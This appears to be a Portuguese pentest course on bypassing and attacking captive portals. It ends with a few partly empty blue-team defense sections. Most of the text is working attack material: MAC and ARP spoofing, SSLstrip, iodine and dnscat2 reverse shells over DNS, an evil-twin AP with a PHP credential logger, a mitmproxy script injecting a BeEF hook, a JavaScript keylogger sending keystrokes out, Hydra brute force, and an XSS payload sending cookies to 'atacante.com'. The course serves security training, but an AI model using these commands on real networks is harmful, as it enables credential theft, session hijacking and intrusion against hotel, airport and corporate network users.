Introdução · Módulo 1
O que é um Captive Portal?
Entenda os mecanismos de funcionamento antes de partir para a exploração.
DHCP DNS Hijack HTTP Redirect Firewall Rules MAC Whitelist

Um captive portal é um gateway de autenticação que controla o acesso a uma rede Wi-Fi. Quando um usuário se conecta, todo tráfego HTTP é interceptado e redirecionado para uma página de login até que a autenticação seja concluída. É amplamente usado em hotéis, aeroportos, cafeterias, redes corporativas e serviços pagos de Wi-Fi.

Como o redirecionamento funciona

O mecanismo de captura usa uma combinação de técnicas de rede:

  1. DHCP com gateway falso — O servidor DHCP entrega ao cliente um gateway padrão que na verdade aponta para o portal, não para a internet.
  2. DNS Hijacking — Qualquer query DNS que o cliente faça é respondida com o IP do portal, independente do domínio consultado.
  3. HTTP Intercept (iptables/nftables) — Regras de firewall redirecionam todo tráfego TCP na porta 80 para o servidor do portal usando NAT.
  4. HTTPS detectado — Para HTTPS o portal responde com um certificado autoassinado ou um redirect 302 para HTTP.
Exemplo — iptables rule para captive portal
# Redirecionar todo HTTP (porta 80) para o portal na porta 8080 iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 \ -j DNAT --to-destination 192.168.1.1:8080 # Bloquear tráfego de IPs não autenticados iptables -A FORWARD -i wlan0 -m mac ! --mac-source AA:BB:CC:DD:EE:FF \ -j DROP

Fluxo completo de autenticação

  1. Cliente conecta ao Wi-FiRecebe IP via DHCP. Tenta acessar qualquer site.
  2. DNS Hijack ativoO servidor DNS do portal resolve qualquer domínio para seu próprio IP (ex: 192.168.1.1).
  3. HTTP interceptadoiptables redireciona a conexão TCP:80 para o servidor do portal, que responde com a página de login.
  4. Usuário se autenticaInsere credenciais, aceita termos, ou paga. O portal valida e libera o acesso.
  5. MAC adicionado à whitelistO endereço MAC do dispositivo é inserido nas regras de firewall como permitido.
⚠️ Todo o conteúdo deste curso é para fins educacionais e de pentest autorizado. Nunca aplique estas técnicas em redes sem permissão explícita por escrito.
Introdução · Módulo 2
Reconhecimento do Captive Portal
Mapear a superfície de ataque antes de qualquer exploração ativa.
nmapcurlBurp SuiteWappalyzerwhatweb

Antes de qualquer ataque, é essencial entender a tecnologia por trás do portal: qual software usa, quais endpoints expõe, e quais parâmetros aceita. Um bom reconhecimento economiza horas de trabalho.

Identificar a tecnologia do portal

Análise de headers HTTP
# Verificar headers de resposta do portal curl -I http://192.168.1.1/ # Exemplo de resposta revelando tecnologia HTTP/1.1 200 OK Server: Apache/2.4.41 (Ubuntu) X-Powered-By: PHP/7.4.3 Set-Cookie: PHPSESSID=abc123; path=/ # Ou com whatweb para fingerprinting completo whatweb http://192.168.1.1/

Scanner de portas e serviços

nmap no gateway do portal
# Scan básico no gateway (normalmente .1 da sub-rede) nmap -sV -sC -p 22,23,80,443,8080,8443 192.168.1.1 # Resultado típico PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 80/tcp open http Apache httpd 2.4.41 443/tcp open https Apache httpd 2.4.41 8080/tcp open http-proxy Squid http proxy 4.10

Enumerar endpoints e parâmetros

Descoberta de diretórios com ffuf
# Buscar endpoints ocultos no portal ffuf -u http://192.168.1.1/FUZZ \ -w /usr/share/wordlists/dirb/common.txt \ -mc 200,301,302,403 # Resultados comuns encontrados /admin [Status: 200] /login [Status: 200] /api [Status: 200] /status [Status: 200] /config [Status: 403]

Inspecionar o formulário de login

Com o Burp Suite interceptando o tráfego, submeta o formulário de login e analise o request POST. Observe os parâmetros enviados (username, password, MAC, redirect URL), cookies definidos, e qualquer token CSRF presente.

ℹ️ Salve todos os headers, cookies e parâmetros encontrados. Eles serão usados nas etapas de exploração. O parâmetro redirect ou url frequentemente permite open redirect ou SSRF.
Indirect Exploitation · Módulo 3
MAC Address Spoofing
A técnica mais simples e eficaz: clonar o MAC de um dispositivo já autenticado.
macchangerip linkarp-scanairodump-ng

Captive portals usam o endereço MAC do dispositivo como identificador na whitelist do firewall. Uma vez autenticado, o MAC fica liberado. Se clonarmos esse MAC, o firewall nos trata como o cliente legítimo.

Passo 1: Descobrir MACs autenticados

Opção A — arp-scan (conectado à rede)
# Listar todos os dispositivos na rede local sudo arp-scan --localnet # Exemplo de saída 192.168.1.10 AA:BB:CC:DD:EE:FF Apple, Inc. 192.168.1.15 11:22:33:44:55:66 Samsung Electronics
Opção B — airodump-ng (modo monitor, sem autenticar)
# Colocar interface em modo monitor sudo airmon-ng start wlan0 # Capturar tráfego e listar clientes associados sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF \ --channel 6 wlan0mon # A coluna STATION mostra os MACs dos clientes conectados

Passo 2: Trocar seu MAC

Usando macchanger
# Desativar interface sudo ip link set wlan0 down # Trocar para o MAC do alvo sudo macchanger -m AA:BB:CC:DD:EE:FF wlan0 # Reativar sudo ip link set wlan0 up # Verificar macchanger -s wlan0 # Current MAC: AA:BB:CC:DD:EE:FF (Apple, Inc.)
Alternativa sem macchanger (ip link)
sudo ip link set wlan0 down sudo ip link set wlan0 address AA:BB:CC:DD:EE:FF sudo ip link set wlan0 up

Passo 3: Conectar à rede

Após trocar o MAC, reconecte ao SSID alvo. O firewall do portal verifica o MAC na whitelist, encontra correspondência e libera o acesso diretamente — sem exibir a página de login.

✅ Este ataque funciona porque o portal confia no MAC como único identificador. Nenhuma senha é necessária — apenas o MAC do dispositivo autenticado.
Indirect Exploitation · Módulo 4
VPN Bypass Técnicas
Usar tunelamento por protocolos alternativos para bypassar restrições do portal.
OpenVPN UDP/TCPWireGuardICMP Tunnelhansptunnel

Muitos captive portals permitem tráfego DNS (UDP 53) e ICMP antes da autenticação para fins de detecção de conectividade. Isso cria oportunidades para tunelamento alternativo sem precisar se autenticar no portal.

Por que alguns portais são vulneráveis a VPN

Portais mal configurados permitem tráfego de saída em certas portas mesmo antes da autenticação. As mais comuns são: UDP 53 (DNS), UDP 67/68 (DHCP), ICMP (ping), e às vezes UDP 1194 (OpenVPN) ou UDP 51820 (WireGuard).

ICMP Tunneling com ptunnel

ptunnel — tráfego TCP dentro de ICMP
# No servidor remoto (VPS com IP público) sudo ptunnel -daemon /tmp/ptunnel.pid # No cliente (dentro da rede do portal) # Encaminhar porta local 8000 para SSH do servidor via ICMP sudo ptunnel -p SEU_VPS_IP \ -lp 8000 \ -da SEU_VPS_IP \ -dp 22 # Em outra janela, SSH pelo túnel ICMP ssh -p 8000 usuario@127.0.0.1

DNS over HTTPS como bypass

cloudflared — DNS over HTTPS
# Instalar cloudflared wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 # Iniciar proxy DNS local via DoH (contorna DNS hijack do portal) ./cloudflared proxy-dns --port 5353 --upstream https://1.1.1.1/dns-query # Usar o DNS local nos resolvers echo "nameserver 127.0.0.1" | sudo tee /etc/resolv.conf
ℹ️ O DNS over HTTPS por si só não bypassa o portal, mas elimina o DNS hijacking, permitindo resolver domínios reais. Combine com DNS tunneling para tráfego completo.
Indirect Exploitation · Módulo 5
ARP Spoofing & Session Hijacking
Posicionar-se como Man-in-the-Middle para interceptar sessões autenticadas.
arpspoofettercapBettercapWiresharkScapy

ARP (Address Resolution Protocol) não tem autenticação. Qualquer host pode enviar ARP replies não solicitados dizendo "meu MAC é X para o IP Y". Quando um dispositivo autenticado envia tráfego para o gateway, podemos interceptá-lo e extrair cookies de sessão do portal.

Como o ARP poisoning funciona

Enviamos ARP replies falsos para dois alvos simultaneamente: dizemos ao cliente autenticado que o MAC do gateway é nosso, e dizemos ao gateway que o MAC do cliente é nosso. Todo tráfego passa por nós.

Ataque com arpspoof

Habilitar IP forwarding e executar o ataque
# Habilitar IP forwarding para não derrubar a conexão da vítima echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward # Terminal 1: Dizer ao gateway que somos o cliente (192.168.1.10) sudo arpspoof -i wlan0 -t 192.168.1.1 192.168.1.10 # Terminal 2: Dizer ao cliente que somos o gateway sudo arpspoof -i wlan0 -t 192.168.1.10 192.168.1.1

Capturar cookies com Bettercap

Bettercap — MitM completo + captura de credenciais
# Iniciar bettercap na interface Wi-Fi sudo bettercap -iface wlan0 # No console interativo do bettercap: net.probe on net.recon on # Ativar ARP spoofing contra todos os hosts set arp.spoof.targets 192.168.1.0/24 arp.spoof on # Capturar credenciais HTTP net.sniff on

Usar o cookie capturado

Uma vez capturado o cookie de sessão do portal (ex: portal_session=abc123), adicione-o manualmente nas ferramentas do navegador (DevTools → Application → Cookies) e acesse o portal. A sessão autenticada já está ativa.

🚨 ARP spoofing gera tráfego anômalo facilmente detectável por IDS/IPS. Em redes monitoradas, este ataque levantará alertas imediatamente.
Indirect Exploitation · Módulo 6
Credential Interception
Capturar credenciais transmitidas em texto puro durante o login no portal.
WiresharktcpdumpSSLstripBurp Suite

Muitos captive portals — especialmente em hotéis e estabelecimentos menores — transmitem as credenciais de login via HTTP sem criptografia. Com uma posição MitM (ARP spoofing), podemos capturar esses dados trivialmente.

Captura passiva com tcpdump

Filtrar POST de login
# Capturar apenas tráfego HTTP POST na rede sudo tcpdump -i wlan0 -A \ 'tcp port 80 and (((ip[2:2] - ((ip[0]&amp;amp;0xf)&amp;lt;&amp;lt;2)) - ((tcp[12]&amp;amp;0xf0)&amp;gt;&amp;gt;2)) != 0)' \ | grep -E "(POST|username|password|user=|pass=)" # Salvar captura completa para análise posterior sudo tcpdump -i wlan0 -w captive_capture.pcap

Análise no Wireshark

Filtros úteis no Wireshark
# Filtrar só HTTP POST (onde ficam as credenciais) http.request.method == "POST" # Ver conteúdo de formulários http contains "password" # Follow TCP Stream em qualquer pacote suspeito: # Botão direito → Follow → TCP Stream

SSLstrip para portais com HTTPS

SSLstrip — downgrade de HTTPS para HTTP
# Redirecionar tráfego HTTPS para sslstrip sudo iptables -t nat -A PREROUTING -p tcp \ --destination-port 443 -j REDIRECT --to-port 8080 # Iniciar sslstrip sudo sslstrip -l 8080 -w sslstrip.log # Monitorar o log em tempo real tail -f sslstrip.log
⚠️ SSLstrip é menos eficaz em portais modernos que usam HSTS (HTTP Strict Transport Security). Nestes casos, o browser recusa a conexão HTTP mesmo que o sslstrip tente o downgrade.
Indirect Exploitation · Módulo 7
DNS Tunneling
Encapsular tráfego TCP/IP dentro de queries DNS para contornar restrições.
iodinednscat2dns2tcpTXT records

Captive portals geralmente liberam DNS (UDP 53) antes da autenticação para permitir a detecção de conectividade pelo sistema operacional. Isso permite encapsular tráfego arbitrário dentro de queries DNS usando um servidor sob nosso controle.

Requisitos para DNS Tunneling

  • Um VPS/servidor externo com IP público (ex: no AWS, DigitalOcean)
  • Um domínio próprio (ex: meudominio.com)
  • Registro NS apontando um subdomínio para o VPS: t.meudominio.com NS vps.meudominio.com

Ataque com iodine

Configuração do servidor (VPS)
# Instalar iodine no VPS sudo apt install iodine # Iniciar servidor iodine # t.meudominio.com é o subdomínio delegado ao VPS sudo iodined -f -c -P senha123 10.0.0.1 t.meudominio.com
Conexão do cliente (dentro do captive portal)
# Instalar iodine no cliente sudo apt install iodine # Conectar ao servidor via DNS tunneling sudo iodine -f -P senha123 t.meudominio.com # Após conectar, uma interface dns0 é criada com IP 10.0.0.2 # Agora podemos criar um túnel SSH por cima ssh -D 1080 usuario@10.0.0.1 # Usar o SOCKS proxy criado no browser para navegar # Configure o browser para SOCKS5 em 127.0.0.1:1080

Alternativa: dnscat2 (shell reverso)

dnscat2 — C2 over DNS
# Servidor (VPS) ruby dnscat2.rb t.meudominio.com # Cliente (dentro do portal) ./dnscat t.meudominio.com # No console do servidor, abrir shell: dnscat2&amp;gt; session -i 1 command (client) 1&amp;gt; shell
ℹ️ DNS tunneling tem largura de banda muito limitada (~10-50 KB/s) e alta latência. É adequado para shells e SOCKS proxy, não para streaming de vídeo.
Client Hijacking · Módulo 8
Hostile Portal Attack
Criar um access point malicioso com portal falso para capturar credenciais.
hostapddnsmasqairbase-ngeaphammernginx

O ataque de hostile portal (também chamado evil twin) consiste em criar uma rede Wi-Fi falsa com o mesmo SSID da rede legítima e hospedar um portal de login idêntico ao original. Usuários que se conectam ao AP falso entregam suas credenciais diretamente ao atacante.

Configurar o AP falso com hostapd

/etc/hostapd/hostile.conf
interface=wlan1 driver=nl80211 ssid=HTB-Guest hw_mode=g channel=6 macaddr_acl=0 ignore_broadcast_ssid=0
Iniciar o AP e DHCP
# Iniciar AP sudo hostapd /etc/hostapd/hostile.conf &amp;amp; # Configurar IP na interface do AP sudo ip addr add 10.0.0.1/24 dev wlan1 sudo ip link set wlan1 up # Iniciar DHCP + DNS com dnsmasq sudo dnsmasq \ --interface=wlan1 \ --dhcp-range=10.0.0.10,10.0.0.100,12h \ --dhcp-option=3,10.0.0.1 \ --dhcp-option=6,10.0.0.1 \ --address=/#/10.0.0.1 \ --no-daemon

Deautenticar clientes da rede legítima

aireplay-ng — deauth broadcast
# Enviar deauth para todos os clientes do AP legítimo # Isso os forçará a reconectar (e alguns se conectarão ao nosso AP falso) sudo aireplay-ng --deauth 0 \ -a AA:BB:CC:DD:EE:FF \ # BSSID do AP legítimo wlan0mon

Capturar credenciais do portal falso

nginx + PHP simples para capturar POST
# /var/www/html/login.php &amp;lt;?php if ($_POST) { $data = date('Y-m-d H:i:s') . ' | ' . 'User: ' . $_POST['username'] . ' | ' . 'Pass: ' . $_POST['password'] . "\n"; file_put_contents('/tmp/creds.txt', $data, FILE_APPEND); header('Location: http://10.0.0.1/success.html'); } ?&amp;gt;
🚨 Ataques de evil twin são ilegais sem autorização explícita. Em ambientes corporativos, sistemas de detecção de rogue APs (WIDS) identificarão o AP falso em minutos.
Client Hijacking · Módulo 9
Malware Portal Injection
Injetar código malicioso nas páginas do portal para comprometer dispositivos de clientes.
BeEFJavaScriptmitmproxyMetasploit

Quando em posição MitM, além de capturar credenciais, podemos injetar JavaScript malicioso nas respostas HTTP do portal. Isso permite usar ferramentas de browser exploitation como o BeEF (Browser Exploitation Framework) para controlar o browser da vítima.

Injetar BeEF hook via mitmproxy

Script de injeção para mitmproxy
# inject_beef.py from mitmproxy import http BEEF_HOOK = '&amp;lt;script src="http://10.0.0.1:3000/hook.js"&amp;gt;&amp;lt;/script&amp;gt;' def response(flow: http.HTTPFlow): if "text/html" in flow.response.headers.get("content-type", ""): content = flow.response.content.decode("utf-8", errors="ignore") if "&amp;lt;/body&amp;gt;" in content: content = content.replace("&amp;lt;/body&amp;gt;", BEEF_HOOK + "&amp;lt;/body&amp;gt;") flow.response.content = content.encode("utf-8")
Executar mitmproxy com o script
# Primeiro, iniciar BeEF cd /usr/share/beef-xss &amp;amp;&amp;amp; ./beef # Depois iniciar mitmproxy com injeção mitmproxy -s inject_beef.py --listen-port 8080 # Redirecionar tráfego HTTP pelo mitmproxy sudo iptables -t nat -A PREROUTING -p tcp --dport 80 \ -j REDIRECT --to-port 8080

Keylogger JavaScript simples

Capturar digitação em tempo real
(function() { var keys = []; document.addEventListener('keydown', function(e) { keys.push(e.key); if (keys.length &amp;gt; 20) { fetch('http://10.0.0.1/log?k=' + btoa(keys.join(''))); keys = []; } }); })();
ℹ️ BeEF permite executar dezenas de módulos: roubo de cookies, geolocalização, captura de câmera/microfone, exfiltração de arquivos, e pivotamento para a rede interna via browser.
Direct Exploitation · Módulo 10
Brute Force Attack
Automatizar tentativas de login contra portais sem proteção adequada.
HydraffufBurp Intrudercurl

Portais sem rate limiting, sem CAPTCHA e sem lockout de conta são vulneráveis a ataques de força bruta. PINs de 4-6 dígitos (comuns em hotéis) têm apenas 10.000–1.000.000 combinações possíveis.

Identificar ausência de proteções

Verificar rate limiting manualmente
# Enviar 10 tentativas rápidas e verificar respostas for i in $(seq 1 10); do curl -s -o /dev/null -w "%{http_code}\n" \ -X POST http://192.168.1.1/login \ -d "username=admin&amp;amp;password=teste$i" done # Se todas retornam 200 ou 401 sem delay: sem rate limiting

Ataque com Hydra

Hydra — brute force em formulário HTTP POST
# Brute force com wordlist hydra -l admin \ -P /usr/share/wordlists/rockyou.txt \ 192.168.1.1 \ http-post-form "/login:username=^USER^&amp;amp;password=^PASS^:Login failed" \ -V -t 4 # Para PINs numéricos de 4 dígitos (0000-9999) hydra -l admin \ -x 4:4:1 \ 192.168.1.1 \ http-post-form "/login:pin=^PASS^:Invalid PIN" \ -t 8

Bypass de CSRF token simples

ffuf com extração de token
# Alguns portais usam CSRF tokens que podem ser extraídos antes de cada tentativa # Script de brute force com token dinâmico #!/bin/bash WORDLIST="/usr/share/wordlists/common-passwords.txt" TARGET="http://192.168.1.1" while read pass; do TOKEN=$(curl -s "$TARGET/login" | grep -oP 'csrf_token.*?value="\K[^"]+') RESULT=$(curl -s -X POST "$TARGET/login" \ -d "username=admin&amp;amp;password=$pass&amp;amp;csrf_token=$TOKEN") if echo "$RESULT" | grep -q "Welcome"; then echo "[+] Senha encontrada: $pass" break fi done &amp;lt; "$WORDLIST"
✅ Relatório de pentest: sempre documente a ausência de rate limiting e lockout como vulnerabilidade crítica. Recomende implementação de CAPTCHA, limite de 5 tentativas por IP, e lockout temporário.
Direct Exploitation · Módulo 11
XSS & Command Injection
Explorar falta de sanitização nas interfaces web do portal para executar código.
Reflected XSSStored XSSCommand InjectionRCEBurp Suite

Captive portals são aplicações web frequentemente desenvolvidas por fabricantes de roteadores com pouca expertise em segurança web. XSS e command injection são comuns nessas interfaces.

XSS Refletido — roubo de sessão admin

Testar parâmetros com payload básico
# Testar campo de redirecionamento http://192.168.1.1/login?redirect=&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; # Testar mensagem de erro http://192.168.1.1/login?msg=&amp;lt;img src=x onerror=alert(document.cookie)&amp;gt; # Payload para roubo de cookie e envio para servidor externo &amp;lt;script&amp;gt; document.location='http://atacante.com/steal?c='+ encodeURIComponent(document.cookie) &amp;lt;/script&amp;gt;

ChilliSpot é um software open-source de controle de access points para redes Wi-Fi com captive portal. Foi a base do movimento de hotspots comerciais na década de 2000 e ainda está presente em firmwares como DD-WRT e OpenWRT. Seu sucessor ativo é o CoovaChilli.

Como o ChilliSpot funciona internamente

O ChilliSpot roda um daemon chamado chilli que assume controle de uma interface de rede interna criando uma interface virtual TUN/TAP. Todos os clientes que se conectam a essa interface ficam em estado não-autenticado por padrão — qualquer request HTTP é interceptado e redirecionado para o portal de login.

ℹ️ O ChilliSpot precisa de dois serviços externos para funcionar: um servidor web (hospeda a página de login via hotspotlogin.cgi) e um servidor RADIUS (valida as credenciais). Geralmente ambos rodam no mesmo servidor, mas são componentes separados.

Arquitetura de autenticação UAM + RADIUS

  1. Cliente conecta via DHCPO ChilliSpot entrega IP ao cliente via DHCP, mas bloqueia todo tráfego até autenticação.
  2. HTTP interceptado → hotspotlogin.cgiQualquer request TCP:80 é redirecionado para o script Perl hotspotlogin.cgi no Apache.
  3. Usuário submete credenciaisO script criptografa a senha via CHAP-Challenge e a reencaminha ao daemon chilli por redirect de browser.
  4. chilli consulta o servidor RADIUSO daemon envia um Access-Request RADIUS com os atributos CHAP-Challenge e CHAP-Password para o servidor configurado (FreeRADIUS, etc).
  5. RADIUS responde Access-AcceptO servidor valida contra seu backend (MySQL, LDAP, Active Directory) e responde. O chilli muda o estado do cliente para autenticado e libera o tráfego.

O ChilliSpot precisa liberar DNS (UDP 53) antes da autenticação para que o cliente consiga resolver o domínio do portal de login. Esse é o vetor que permite DNS tunneling — o software foi projetado assim por necessidade, e não por descuido.

Captive Portals em Redes Ethernet
Um ponto ignorado pela maioria: portais de autenticação não são exclusivos de Wi-Fi — redes cabeadas de hotéis, conferências e escritórios também os usam.

Bugher explicitamente abordou redes Ethernet com captive portal em sua palestra — algo que o módulo do HTB Academy não cobre. Redes cabeadas em hotéis (porta RJ-45 no quarto), centros de convenções, salas de conferência corporativas, e até alguns ISPs usam o mesmo mecanismo de captive portal, só que via cabo.

Como funciona um captive portal em Ethernet

O mecanismo é tecnicamente idêntico ao Wi-Fi: o switch ou roteador entrega um IP via DHCP mas bloqueia tráfego de saída via iptables/firewall até que o MAC seja adicionado à whitelist. A diferença é que não há interface wireless — o cliente se conecta fisicamente via cabo.

Arquitetura típica de hotel — porta RJ-45 no quarto
Laptop (eth0) ──RJ-45──► Switch do hotel ──► Gateway/Router │ ChilliSpot ou pfSense (interface eth1 = quartos) │ DHCP: 10.10.x.x/24 DNS: liberado (UDP 53) HTTP: redirecionado ao portal HTTPS: bloqueado até autenticar

Diferenças práticas vs Wi-Fi

1. Não há interface wireless para monitorar

Técnicas que dependem de modo monitor (airodump-ng, aireplay-ng) não se aplicam. Para descobrir MACs autenticados em Ethernet você precisa de acesso à rede ou usar ARP scan depois de conectar.

Descobrir MACs em rede Ethernet cabeada
# Após conectar o cabo e receber IP (mesmo sem autenticar) # o DHCP já te coloca na sub-rede local # ARP scan para ver todos os dispositivos na sub-rede sudo arp-scan --localnet --interface eth0 # Alternativa: nmap com detecção de MAC sudo nmap -sn 10.10.1.0/24 --send-ip # O gateway do portal geralmente está em .1 ou .254 # Os outros IPs são outros hóspedes/usuários

2. MAC spoofing é ainda mais eficaz

Em redes Ethernet de hotel, dispositivos frequentemente se desconectam (hóspede dorme, sai do quarto). Esses MACs ficam na whitelist por horas. Clonar um MAC de um quarto desocupado é trivial e sem risco de conflito de tráfego.

MAC spoofing em interface Ethernet (eth0)
# Desativar interface cabeada sudo ip link set eth0 down # Trocar o MAC para o de um hóspede autenticado sudo ip link set eth0 address AA:BB:CC:DD:EE:FF # Reativar e requisitar novo IP via DHCP sudo ip link set eth0 up sudo dhclient eth0 # Verificar — deve receber IP sem ser redirecionado ao portal curl -I http://example.com

3. DNS tunneling funciona da mesma forma

A abertura do UDP 53 antes da autenticação existe em portais Ethernet pelo mesmo motivo do Wi-Fi — o cliente precisa resolver o domínio do portal. Iodine funciona exatamente da mesma forma.

802.1X como alternativa mais segura (e como bypassar)

Redes corporativas mais sofisticadas usam 802.1X (NAC — Network Access Control) em vez de captive portal HTTP. O 802.1X autentica a nível de porta do switch via EAP/RADIUS, antes mesmo de entregar IP. É mais difícil de bypassar — mas ainda vulnerável a ataques de identidade falsa com ferramentas como eapmd5pass ou freeradius-wpe.

MAC Spoofing: A Abordagem de Bugher
Bugher vai além do MAC spoofing básico — ele ensina como clonar sessões expiradas sem conflito de tráfego, a técnica mais limpa e discreta disponível.

O módulo de MAC spoofing do curso HTB cobre a técnica básica — clone o MAC de um dispositivo ativo e conecte. Mas Bugher destaca um problema crítico dessa abordagem: se o dispositivo original ainda está na rede, você e ele recebem metade dos pacotes cada um, resultando em uma conexão instável e detectável.

⚠️ "Spoofing a MAC address of a device that is still connected to a network is extremely easy to detect since both you and the client you are spoofing receive half the packets. It results in a choppy connection with lots of dropped packets." — referência direta à abordagem de Bugher.

A solução de Bugher: sessões expiradas

Em vez de clonar um dispositivo ativo, Bugher recomenda monitorar a rede por períodos de tempo e identificar dispositivos que se desconectaram — mas cujas sessões ainda estão ativas na whitelist do portal. Esses MACs são candidatos perfeitos: ninguém mais está usando aquela sessão.

Técnica passo a passo

  1. Conectar à rede e capturar tráfego por um períodoNão precisa estar autenticado — o DHCP já te coloca na sub-rede local. Use tcpdump ou Wireshark para capturar tráfego ARP e registrar quais MACs estão ativos.
  2. Registrar MACs e seus IPs com timestampsAnote qual MAC estava ativo em qual horário. Em redes de hotel, dispositivos se desconectam à noite, quando os hóspedes dormem.
  3. Monitorar quais MACs param de responderEnvie ARP requests para os IPs conhecidos. Quando um MAC para de responder por vários minutos, a sessão provavelmente está expirada — mas pode ainda estar na whitelist.
  4. Clonar o MAC + IP da sessão expiradaTroque seu MAC e configure o mesmo IP estático. Sem conflito porque o dispositivo original saiu da rede.

Por que a sessão ainda funciona?

O captive portal adiciona o MAC na whitelist do firewall (via iptables) quando o usuário se autentica. Essa whitelist é persistida em memória ou arquivo. Quando o dispositivo se desconecta, a regra de firewall não é removida imediatamente — ela expira depois de um tempo (definido pelo parâmetro Session-Timeout ou Idle-Timeout do RADIUS, tipicamente 1h a 24h). Durante esse intervalo, qualquer dispositivo com aquele MAC tem acesso liberado.

MAB: Se Passar por uma Impressora ou Dispositivo IoT
Redes corporativas e hoteleiras criam listas de MACs isentos do portal para dispositivos que não têm navegador — impressoras, TVs, câmeras IP, telefones VoIP. Esses MACs são alvos perfeitos.
MABOUI LookupmacchangernmapRADIUSWiresharkarp-scan

Uma impressora, TV de hotel, câmera IP ou telefone VoIP não tem navegador — não consegue abrir o captive portal e clicar em "aceitar os termos". Por isso, administradores de rede criam uma lista de MACs isentos (whitelist estática no firewall ou no servidor RADIUS via MAB) para que esses dispositivos tenham acesso automático à rede sem passar pelo portal. Esse mecanismo se chama MAC Authentication Bypass (MAB).

ℹ️ A vulnerabilidade fundamental do MAB: o sistema confia cegamente no MAC address como identidade do dispositivo. A implementação legada do MAB é vulnerável a spoofing de MAC address tanto na conexão entre o dispositivo autenticador e o dispositivo de rede quanto na conexão entre o dispositivo de rede e o servidor RADIUS.

Como o MAB funciona na prática

  1. Dispositivo se conecta à redeUma impressora liga e envia um DHCP request. O switch/AP captura o MAC de origem.
  2. Switch tenta 802.1X — sem respostaA impressora não responde ao desafio EAP (não suporta 802.1X). Após timeout, o switch cai no fallback MAB.
  3. Switch envia o MAC ao servidor RADIUSO MAC é enviado como username E password num Access-Request RADIUS. O RADIUS verifica na lista de MACs autorizados.
  4. RADIUS responde Access-AcceptO MAC está na lista — acesso liberado sem portal, sem credenciais humanas. O switch coloca o dispositivo na VLAN correta.
Como o RADIUS recebe o MAC em MAB — username = MAC address
Access-Request RADIUS enviado pelo switch: User-Name = "aa-bb-cc-dd-ee-ff" &lt;-- MAC como username User-Password = "aa-bb-cc-dd-ee-ff" &lt;-- MAC como password (ou pre-shared key) NAS-Port-Type = Ethernet Calling-Station-Id = "AA:BB:CC:DD:EE:FF" Se o MAC estiver na lista: Access-Accept → acesso direto, sem portal Se não estiver: Access-Reject → redirecionado ao captive portal

O primeiro desafio é descobrir quais MACs estão na whitelist. Existem três abordagens:

A) Observação passiva — ver dispositivos que não passam pelo portal

MAB é frequentemente usado para dispositivos que não suportam autenticação 802.1X, como impressoras, dispositivos IoT ou telefones VoIP. Em uma empresa de médio porte, podem existir dezenas de impressoras, câmeras, sensores e telefones VoIP com MACs na whitelist — todos alvos em potencial.

Diferença entre MAB em captive portal vs MAB em 802.1X corporativo

Dois cenários de MAB — mesma vulnerabilidade, contextos diferentes
CENÁRIO 1 — Hotel / rede pública com captive portal: Whitelist estática no firewall (iptables/nftables) Admin cadastrou MAC da TV e da Chromecast do quarto Qualquer dispositivo com esse MAC tem acesso direto → Clone o MAC: bypass imediato CENÁRIO 2 — Corporativo com 802.1X + MAB fallback: Switch tenta EAP primeiro; sem resposta → fallback MAB Switch consulta RADIUS com o MAC como credencial RADIUS verifica em banco de dados de MACs autorizados → Clone MAC de impressora cadastrada: bypass do 802.1X inteiro
🚨 Se um atacante conhece ou suspeita que o MAC address de uma impressora está na lista MAB, ele pode fazer spoofing desse MAC e ganhar acesso à rede junto com a capacidade de comunicar-se na rede. Em redes corporativas, isso frequentemente dá acesso a VLANs internas — não apenas à internet.

Como detectar e se defender (perspectiva blue team)

Para quem estuda defesa, vale entender as contramedidas:

  • DHCP fingerprinting — uma impressora HP solicita DHCP com opções específicas (Option 60, hostname). Um laptop fingindo ser impressora envia opções diferentes. Sistemas NAC avançados detectam essa inconsistência.
  • Profiling de dispositivo — monitorar se o "dispositivo" começa a fazer requisições HTTP, DNS de domínios incomuns ou abre conexões SSH. Impressoras não fazem isso.
  • MAB baseado em OUI + porta física — vincular o MAC isento à porta específica do switch onde a impressora está conectada fisicamente. MAC na porta errada = alerta.
  • 802.1X com certificados — substituir MAB por 802.1X com certificados de dispositivo (mais difícil de falsificar que um MAC).

🛡️ Defesa: Anti MAC Spoofing
Como detectar e mitigar spoofing de MAC address em redes com captive portal.

Resumo das contramedidas

  • arpwatch — monitora mudanças de MAC↔IP na rede e alerta quando o mesmo IP aparece com MAC diferente
  • DHCP snooping — vincula MAC ao IP entregue pelo DHCP; detecta conflitos
  • Port security (switches gerenciados) — limita quantos MACs podem aparecer numa porta física
  • Session timeout agressivo — reduz a janela em que MACs expirados são úteis
  • DHCP + ARP binding — rejeita tráfego de IP que não corresponde ao MAC registrado no DHCP

arpwatch — detecção de mudança de MAC

Instalar e configurar arpwatch
# Instalar sudo apt install arpwatch # Configurar interface monitorada sudo nano /etc/default/arpwatch # IFACE="wlan0" ← interface do portal # Iniciar sudo systemctl enable arpwatch sudo systemctl start arpwatch # O arpwatch envia e-mail quando detecta: # "new station" — novo MAC visto pela primeira vez # "changed ethernet address" — IP mudou de MAC (spoofing!) # "flip flop" — MAC alternando entre dois IPs (conflito)

iptables — limitar sessões por MAC e detectar duplicatas

Regras de firewall para mitigar MAC spoofing

Blue Team · Módulo 2
🌐 Defesa: Bloquear DNS Tunneling
Como restringir o DNS para eliminar o vetor de tunneling sem quebrar a experiência do usuário.
dnsmasqiptablesdnsdistRate Limiting

Resumo das contramedidas

  • DNS interno forçado — bloquear UDP 53 para qualquer servidor externo; só o DNS interno do portal responde
  • Rate limiting de queries — iodine gera dezenas de queries/segundo; limitar a 10–20 queries/s por IP detecta o ataque
  • Bloquear tipos de registro incomuns — iodine usa registros TXT, NULL e CNAME; bloquear esses tipos antes da autenticação
  • Tamanho máximo de query — queries de DNS tunneling têm payloads grandes (subdomain longo); rejeitar queries com label > 63 chars

dnsmasq — DNS interno com rate limiting

/etc/dnsmasq.conf — configuração defensiva
